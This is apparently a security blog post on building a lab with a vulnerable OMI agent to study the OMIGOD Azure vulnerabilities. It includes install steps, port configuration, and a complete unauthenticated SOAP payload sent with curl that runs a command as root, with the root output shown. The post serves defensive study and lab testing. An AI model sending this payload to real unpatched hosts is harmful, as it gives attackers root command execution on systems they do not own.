---
title: Experimenting with the OMIGOD vulnerabilities!
description: Being able to experiment with vulnerabilities is crucial to gain a deeper understanding of them. In this post, we'll look at creating an environment with a vulnerable version of the OMI agent.
slug: omi-god
date: 2021-09-24T20:00:00+01:00
categories: [linux, azure, omigod]
cover: ./images/cover.jpg
---

## Setting The Scene

Lots has been written about OMIGod already by now, but up until a few weeks ago, the OMI agent was something relatively unknown. All of that changed recently when the team over at WIZ discovered 4 sets of vulnerabilities hiding within its source code. If you haven't heard of OMIGOD before I would hike recommend you pause right here and give the articles from the WIZ team a quick read ([omigod-critical-vulnerabilities-in-omi-azure](https://www.wiz.io/blog/omigod-critical-vulnerabilities-in-omi-azure), [secret-agent-exposes-azure-customers-to-unauthorized-code-execution](https://www.wiz.io/blog/secret-agent-exposes-azure-customers-to-unauthorized-code-execution)). These will go down deep into the nitty-gritty details of this particular set of vulnerabilities. In this post, I mainly want to focus on creating an environment to safely play around with them. But for those who just need the TLDR, let me set the scene real quickly. OMIGOD is a set of vulnerabilities discovered to be lurking around in some Linux VM's running on Azure. There are 4 CVE's in total:

- [CVE-2021-38645 - Local Privilege Escalation](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-38645)
- [CVE-2021-38647 - Unauthenticated Remote Command Execution as Root](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-38647)
- [CVE-2021-38648 - Local Privilege Escalation](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-38648)
- [CVE-2021-38649 - Local Privilege Escalation](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-38649)

It's a bit of a mixed bag, but all are critical vulnerabilities nonetheless. CVE-2021-38647 is especially a juicy one given it's a textbook RCE that is dead simple to execute. Most of the articles online refer to the OMI agent as the secret management agent installed by Azure. The reason for this is that the OMI agent doesn't come pre-installed by default. Installing a new VM on Azure with a vanilla Ubuntu will give precisely what you expect a basic Ubuntu image like you would get on any other platform. It's not until you enable any of the following services until Azure starts provisioning OMI for you:

- Azure Automation
- Azure Automatic Update
- Azure Operations Management Suite
- Azure Log Analytics
- Azure Configuration Management
- Azure Diagnostics
- Azure Container Insights

All of this happens behind the scenes without most users knowing about it. But not all of these services will grant an attacker access to remote code execution. As we saw earlier the list of CVE's is a mixed bag between remote code execution and local privilege escalation attacks. Each service you enable configures the OMI agent slightly different and in order to get remote code execution (CVE-2021-38647) the OMI agents needs to be configured to listen on port `5986`. For this some extra configuration is required that tells the agent to expose its HTTP API on that port. Some of these services will not set expose the agent and leave it configured to a UNIX socket which reduces the attack surface and that's where the local privilege escalation CVE's come into play. This makes it rather confusing and difficult to figure out what combination of services leaves you exposed to what vulnerability. Luckily the folks over at bleeping computer have done a fantastic job documenting each of the services and their potential attack vectors.

| Extension                                           | Deployment Model  | Vulnerability Exposure    | Fixed Version                                                                                                                                    |
| --------------------------------------------------- | ----------------- | ------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------ |
| OMI as standalone package                           | On Premises/Cloud | Remote Code Execution     | OMI module v1.6.8-1                                                                                                                              |
| System Center Operations Manager (SCOM)             | On Premises       | Remote Code Execution     | OMI version v1.6.8-1                                                                                                                             |
| Azure Automation State Configuration, DSC Extension | Cloud             | Remote Code Execution     | DSC Agent versions: 2.71.1.25, 2.70.0.30, 3.0.0.3                                                                                                |
| Azure Automation State Configuration, DSC Extension | On Premises       | Remote Code Execution     | OMI version v1.6.8-1                                                                                                                             |
| Log Analytics Agent                                 | On Premises       | Local Privilege Elevation | OMS Agent for Linux GA v1.13.40-0                                                                                                                |
| Log Analytics Agent                                 | Cloud             | Local Privilege Elevation | OMS Agent for Linux GA v1.13.40-0                                                                                                                |
| Azure Diagnostics (LAD)                             | Cloud             | Local Privilege Elevation | LAD v4.0.11 and LAD v3.0.133                                                                                                                     |
| Azure Automation Update Management                  | Cloud             | Local Privilege Elevation | OMS Agent for Linux GA v1.13.40-0                                                                                                                |
| Azure Automation Update Management                  | On Premises       | Local Privilege Elevation | OMS Agent for Linux GA v1.13.40-0                                                                                                                |
| Azure Automation                                    | Cloud             | Local Privilege Elevation | OMS Agent for Linux GA v1.13.40-0                                                                                                                |
| Azure Automation                                    | On Premises       | Local Privilege Elevation | OMS Agent for Linux GA v1.13.40-0                                                                                                                |
| Azure Security Center                               | Cloud             | Local Privilege Elevation | OMS Agent for Linux GA v1.13.40-0                                                                                                                |
| Container Monitoring Solution                       | Cloud             | Local Privilege Elevation | [See Note 2](https://msrc-blog.microsoft.com/2021/09/16/additional-guidance-regarding-omi-vulnerabilities-within-azure-vm-management-extensions) |

Reference: [https://www.bleepingcomputer.com/news/microsoft/microsoft-asks-azure-linux-admins-to-manually-patch-omigod-bugs/](https://www.bleepingcomputer.com/news/microsoft/microsoft-asks-azure-linux-admins-to-manually-patch-omigod-bugs/)

## Creating The Environment

Microsoft has already patched the agent, hence new VM's in Azure will get provisioned with a more recent version of the agent that isn't vulnerable anymore. So in this post, I'll walk through the steps required to get a vulnerable OMI agent up and running from scratch. In this particular case, I opted for a CentOS flavoured distro called AlmaLInux. But basically, any CentOS or Debian OS will do the job just fine. Spin any of these up in your favourite hypervisor and create yourself a standard user named azureuser, and with that, it should be easy to follow along with the rest of this article.

The OMI agent itself gets developed in the open, and the source is available on GitHub. From here, we can grab a version of the OMI agent from the releases page. The last vulnerable version before things got patched up is `v1.6.8-0`, and depending on the OS you can choose to install via a `.deb` or `.rpm`. There are few different installers available on this page, so to figure out if you need the ssl_100 or the ssl_110 link you'll need to check your `openssl` version:

```sh
$ openssl version

OpenSSL 1.1.1g FIPS  21 Apr 2020
```

If this returns version 1.1.x, then go for the ssl_110 download, otherwise grab the ssl_100 link. On a CentOS flavoured machine to download and install OMI run the following commands:

```sh
$ curl -LO https://github.com/microsoft/omi/releases/download/v1.6.8-0/omi-1.6.8-0.ssl_110.ulinux.x64.rpm

$ rpm -Uvh ./omi-1.6.8-0.ssl_110.ulinux.x64.rpm
```

Whereas on a Debian flavoured machine it will be something like

```sh
$ curl -LO https://github.com/microsoft/omi/releases/download/v1.6.8-0/omi-1.6.8-0.ssl_110.ulinux.x64.deb

$ dpkg -i ./omi-1.6.8-0.ssl_100.ulinux.x64.deb
```

This might take a minute or two to get fully installed, hence this might be the right time to go and grab a quick coffee. When everything is installed we can do a bit of reconnaissance and get a sense of the lay of the land. See what binaries are installed and features get exposed how. All binaries for the agent are installed in `/opt/omi` and are split up over a `bin` and `lib` folder:

```sh
$ ls -al /opt/omi/bin

total 3316
drwxr-xr-x. 3 root root    159 Sep 23 08:56 .
drwxr-xr-x. 4 root root     43 Sep 23 08:56 ..
-rwxr-xr-x. 1 root root 777264 Jan 14  2021 omiagent
-rwxr-xr-x. 1 root root 161296 Jan 14  2021 omicli
-rwxr-xr-x. 1 root root  59416 Jan 14  2021 omiconfigeditor
-rwxr-xr-x. 1 root root 929448 Jan 14  2021 omiengine
-rwxr-xr-x. 1 root root 436832 Jan 14  2021 omigen
-rwxr-xr-x. 1 root root  71704 Jan 14  2021 omireg
-rwxr-xr-x. 1 root root 938376 Jan 14  2021 omiserver
-rwxr-xr-x. 1 root root   6144 Jan 13  2021 service_control
drwxr-xr-x. 2 root root    171 Sep 23 08:56 support

$ ls -al /opt/omi/lib

total 1160
drwxrwxr-x. 2 root omiusers    199 Sep 23 08:56 .
drwxr-xr-x. 4 root root         43 Sep 23 08:56 ..
lrwxrwxrwx. 1 root root         23 Sep 23 08:56 libcrypto.so.1.1.0 -> /lib64/libcrypto.so.1.1
lrwxrwxrwx. 1 root root         29 Sep 23 08:56 .libcrypto.so.1.1.0.hmac -> /lib64/.libcrypto.so.1.1.hmac
-rwxr-xr-x. 1 root root     162824 Jan 14  2021 libmicxx.so
-rwxr-xr-x. 1 root root     728248 Jan 14  2021 libmi.so
-rwxr-xr-x. 1 root root     238000 Jan 14  2021 libomiclient.so
-rwxr-xr-x. 1 root root      49320 Jan 14  2021 libomiidentify.so
lrwxrwxrwx. 1 root root         20 Sep 23 08:56 libssl.so.1.1.0 -> /lib64/libssl.so.1.1
lrwxrwxrwx. 1 root root         26 Sep 23 08:56 .libssl.so.1.1.0.hmac -> /lib64/.libssl.so.1.1.hmac
```

The installation itself registered a service called `omid` which should be running and reporting as active:

```sh
$ systemctl status omid
● omid.service - OMI CIM Server
   Loaded: loaded (/usr/lib/systemd/system/omid.service; enabled; vendor preset: disabled)
   Active: active (running) since Thu 2021-09-23 08:56:51 UTC; 40min ago
  Process: 1238 ExecStart=/opt/omi/bin/omiserver -d (code=exited, status=0/SUCCESS)
  Process: 1201 ExecStartPre=/opt/omi/bin/support/installssllinks (code=exited, status=0/SUCCESS)
 Main PID: 1241 (omiserver)
    Tasks: 2 (limit: 8988)
   Memory: 1.2M
   CGroup: /system.slice/omid.service
           ├─1241 /opt/omi/bin/omiserver -d
e
Sep 23 08:56:51 localhost.localdomain systemd[1]: Starting OMI CIM Server...
Sep 23 08:56:51 localhost.localdomain systemd[1]: Started OMI CIM Server.
```

It shows that it has 2 processes up and running named `omiserver` and `omiengine`, which we can easily verify with

```sh
$ ps auxf | grep omi | grep -v grep
root        1241  0.0  0.1  36980  2976 ?        S    08:56   0:00 /opt/omi/bin/omiserver -d
omi         1242  0.0  0.1  25840  2248 ?        S    08:56   0:00  \_ /opt/omi/bin/omiengine -d --logfilefd 3 --socketpair 10
```

To get a better understanding of what is going on here, we need to have a closer look at OMI's architecture. OMI has a frontend-backed architecture as we can see here it split up in the `omiserver` and the `omiengine`. A user doesn't directly communicate to the `omiserver`. As we can see from our `ps` command the server is running as root, whereas the frontend process called `omiengine` has lower privileges and is running as the `omi` user. With `ss` we can get bet understanding of how these processes communicate with one another:

```sh
$ ss -ax | grep omi
u_str LISTEN 0      15                           /var/opt/omi/run/omiserver.sock 26621            * 0
u_str LISTEN 0      15                   /etc/opt/omi/conf/sockets/omi_p4M9hsPvN 36201            * 0

$ ls -al /etc/opt/omi/conf/sockets/omi_p4M9hsPvN
srwxrwxrwx. 1 root root 0 Sep 23 08:56 /etc/opt/omi/conf/sockets/omi_p4M9hsPvN

$ ls -al /var/opt/omi/run/omiserver.sock
srwxrwxrwx. 1 omi omi 0 Sep 23 08:56 /var/opt/omi/run/omiserver.sock
```

As we can see here the only way to communicate with the server is through a UNIX socket found in the `/etc/opt/omi/conf/sockets` directory, which is only accessible to the omi user. This means that only processes under the omi user can communicate with `omiserver`. Any local user can communicate with the engine through `/var/opt/omi/run/omiserver.sock` which has full RWX permissions. To put this into a picture the following image from the WIZ article does a great job at visualizing this setup

![Omi Architecture](./images/omi-architecture.png)

The `omicli` in `/opt/omi/bin` can be used to send a command to the server:

```sh
$ /opt/omi/bin/omicli iv root/scx { SCX_OperatingSystem } ExecuteShellCommand { command 'id' timeout 0 }

/opt/omi/bin/omicli: result: MI_RESULT_INVALID_NAMESPACE
/opt/omi/bin/omicli: result: The target namespace does not exist.
instance of OMI_Error
{
    OwningEntity=OMI:CIMOM
    MessageID=OMI:MI_Result:3
    Message=The target namespace does not exist.
    MessageArguments={}
    PerceivedSeverity=7
    ProbableCause=0
    ProbableCauseDescription=Unknown
    CIMStatusCode=3
    OMI_Code=3
    OMI_Category=10
    OMI_Type=MI
    OMI_ErrorMessage=The target namespace does not exist.
}
```

This returns an error indicating that the target namespace does not exist. We'll only run into this error when trying to run the OMI agent locally, when provisioned on Azure it will have this namespace set up by default. As it turns out the OMI has an extensibility module that allows user to extend it features set by installing particular providers. For example, users can query docker container information [using the appropriate docker provider](https://github.com/Microsoft/Docker-Provider) or retrieve and create Unix processes using the [SCX Provider](https://github.com/microsoft/SCXcore). It's this latter here that will install the `root/scx` namespace. This provider is also open-source and can be installed directly from GitHub https://github.com/microsoft/SCXcore. When looking at the releases there might be a couple of newer versions already. In essence, it doesn't really matter what version we choose because the vulnerability lies in the OMI agent, not in this provider. But the version published at the time the vulnerability got reported was `1.6.6-0`, so let's pick that one:

Again for CentOS flavoured machine run:

```sh
$ curl -LO https://github.com/microsoft/SCXcore/releases/download/1.6.6-0/scx-1.6.6-0.ssl_110.universal.x64.rpm

$ rpm -Uvh ./scx-1.6.6-0.ssl_110.universal.x64.rpm
```

Or on a Debian flavoured machine run:

```sh
$ curl -LO https://github.com/microsoft/SCXcore/releases/download/1.6.6-0/scx-1.6.6-0.ssl_110.universal.x64.deb

$ dpkg -i ./scx-1.6.6-0.ssl_110.universal.x64.deb
```

Restart the `omid` service with `systemctl restart omid` and try running the command again, it should now successfully return the current user id:

```sh
$ /opt/omi/bin/omicli iv root/scx { SCX_OperatingSystem } ExecuteShellCommand { command 'id' timeout 0 }

instance of ExecuteShellCommand
{
    ReturnValue=true
    ReturnCode=0
    StdOut=uid=1000(azureuser) gid=1000(azureuser) groups=1000(azureuser) context=system_u:system_r:unconfined_service_t:s0

    StdErr=
}
```

All of this results in an environment that enables playing around with the local privileges escalation bugs. But as mentioned before to play around with the remote code execution one we'll need the agent to listen on `5986`. At the moment there isn't anything listening on that port;

```sh
$ ss -tlpn

State              Recv-Q             Send-Q                         Local Address:Port                         Peer Address:Port             Process
LISTEN             0                  128                                  0.0.0.0:111                               0.0.0.0:*                 users:(("rpcbind",pid=721,fd=4),("systemd",pid=1,fd=39))
LISTEN             0                  128                                  0.0.0.0:22                                0.0.0.0:*                 users:(("sshd",pid=792,fd=4))
LISTEN             0                  128                                     [::]:111                                  [::]:*                 users:(("rpcbind",pid=721,fd=6),("systemd",pid=1,fd=41))
LISTEN             0                  128                                     [::]:22                                   [::]:*                 users:(("sshd",pid=792,fd=6))
```

We talked about it earlier but not every service you enable in Azure will configure the OMI agent to listen on port `5986`, that also count for the default OMI installation. To get it to listen on this port we'll need to configure this manually by modifying the following file `/etc/opt/omi/conf/omiserver.conf`

```sh
# omiserver configuration file
## httpport -- listening port for the binary protocol (default is 5985)
##
httpport=0

##
## httpsport -- listening port for the binary protocol (default is 5986)
##
httpsport=5986
```

Restart the `omid` service with `systemctl restart omid`and we should now have it listen on port `5986`:

```sh
$ ss -tlpn

State              Recv-Q             Send-Q                         Local Address:Port                         Peer Address:Port             Process
LISTEN             0                  128                                  0.0.0.0:111                               0.0.0.0:*                 users:(("rpcbind",pid=721,fd=4),("systemd",pid=1,fd=39))
LISTEN             0                  128                                  0.0.0.0:22                                0.0.0.0:*                 users:(("sshd",pid=792,fd=4))
LISTEN             0                  128                                     [::]:111                                  [::]:*                 users:(("rpcbind",pid=721,fd=6),("systemd",pid=1,fd=41))
LISTEN             0                  128                                     [::]:22                                   [::]:*                 users:(("sshd",pid=792,fd=6))
LISTEN             0                  15                                         *:5986                                    *:*                 users:(("omiengine",pid=22084,fd=6))
```

At this point everything should be in place to play around with the 4 different set of vulnerabilities reported. Let's have a quick look at the remote code execution vulnerability (

### Remote Code Execution

The vulnerability is pretty straightforward, it allows passing a simple SOAP message to the service and without setting any authorization headers it will execute a given command as the root user. The soap message to execute the `id` command looks as follows;

```xml
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:h="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:xsi="http://www.w3.org/2001/XMLSchema">
   <s:Header>
      <a:To>HTTP://192.168.1.1:5986/wsman/</a:To>
      <w:ResourceURI s:mustUnderstand="true">http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem</w:ResourceURI>
      <a:ReplyTo>
         <a:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
      </a:ReplyTo>
      <a:Action>http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem/ExecuteShellCommand</a:Action>
      <w:MaxEnvelopeSize s:mustUnderstand="true">102400</w:MaxEnvelopeSize>
      <a:MessageID>uuid:0AB58087-C2C3-0005-0000-000000010000</a:MessageID>
      <w:OperationTimeout>PT1M30S</w:OperationTimeout>
      <w:Locale xml:lang="en-us" s:mustUnderstand="false" />
      <p:DataLocale xml:lang="en-us" s:mustUnderstand="false" />
      <w:OptionSet s:mustUnderstand="true" />
      <w:SelectorSet>
         <w:Selector Name="__cimnamespace">root/scx</w:Selector>
      </w:SelectorSet>
   </s:Header>
   <s:Body>
      <p:ExecuteShellCommand_INPUT xmlns:p="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem">
         <p:command>id</p:command>
         <p:timeout>0</p:timeout>
      </p:ExecuteShellCommand_INPUT>
   </s:Body>
</s:Envelope>
```

Save this to a file named `omi-soap-payload.xml` so that we can post this to the OMI service with curl:

```sh
$ curl -i -XPOST -H "Content-Type: application/soap+xml;charset=UTF-8" -d @omi-soap-payload.xml --insecure https://192.168.122.78:5986/wsman

HTTP/1.1 200 OK
Content-Length: 1465
Connection: Keep-Alive
Content-Type: application/soap+xml;charset=UTF-8

<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:wsen="http://schemas.xmlsoap.org/ws/2004/09/enumeration" xmlns:e="http://schemas.xmlsoap.org/ws/2004/08/eventing" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:wsmb="http://schemas.dmtf.org/wbem/wsman/1/cimbinding.xsd" xmlns:wsman="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:wxf="http://schemas.xmlsoap.org/ws/2004/09/transfer" xmlns:cim="http://schemas.dmtf.org/wbem/wscim/1/common" xmlns:msftwinrm="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd" xmlns:wsmid="http://schemas.dmtf.org/wbem/wsman/identity/1/wsmanidentity.xsd"><SOAP-ENV:Header><wsa:To>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</wsa:To><wsa:Action>http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem/ExecuteShellCommand</wsa:Action><wsa:MessageID>uuid:B5C8928A-CCBF-0005-0000-000000010000</wsa:MessageID><wsa:RelatesTo>uuid:0AB58087-C2C3-0005-0000-000000010000</wsa:RelatesTo></SOAP-ENV:Header><SOAP-ENV:Body><p:SCX_OperatingSystem_OUTPUT xmlns:p="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem"><p:ReturnValue>TRUE</p:ReturnValue><p:ReturnCode>0</p:ReturnCode><p:StdOut>uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:unconfined_service_t:s0&#10;</p:StdOut><p:StdErr></p:StdErr></p:SCX_OperatingSystem_OUTPUT></SOAP-ENV:Body></SOAP-ENV:Envelope>%
```

The response should return a bit XML with the output of the command. This makes it a bit more difficult to figure out if the command ran successfully. But you should be able to find the `<p:StdOut>` tag containing the result of the command.

## Conclusion

Everything about this set of vulnerabilities is so intriguing. It shows how these undocumented agents that cloud providers install on our VM's can open us to a wide range of attacks. Having an environment to play around with the vulnerability is really helpful, in my opinion. It will allow us as blue teamers to get a good sense of the attack surface and validate any measures we put into our environments. Because until this point, it's still unclear who is responsible for patching up vulnerabilities like this. Is it the user that isn't even aware the agent exists? Or is it the cloud provider that should be messing with our setups and have admin rights on our machines? Whoever you think is responsible, I hope this article provided you with the right tools to start taking matters into your own hands!
